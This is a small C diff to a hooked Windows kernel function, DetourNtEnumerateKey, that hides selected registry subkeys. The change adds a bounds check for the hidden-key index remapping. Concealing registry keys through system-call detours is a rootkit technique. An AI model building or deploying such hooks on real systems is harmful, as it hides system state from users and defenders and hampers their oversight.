@@ -57,6 +57,10 @@ NTSTATUS DetourNtEnumerateKey(
 		// there are keys that should be hidden. That means that we want to return
 		// the Index'th subkey of this key (OkSubkeyIndexesPtr[Index])
 		if (HideSubkeyIndexesCount > 0) {
+			if (Index >= OkSubkeyIndexesCount) {
+				ExFreePool(OkSubkeyIndexesPtr); // free the buffer
+				return STATUS_NO_MORE_ENTRIES;
+			}
 			ULONG NewIndex = OkSubkeyIndexesPtr[Index];
 			ExFreePool(OkSubkeyIndexesPtr); // free the buffer
 			return OriginalNtEnumerateKey(KeyHandle, NewIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
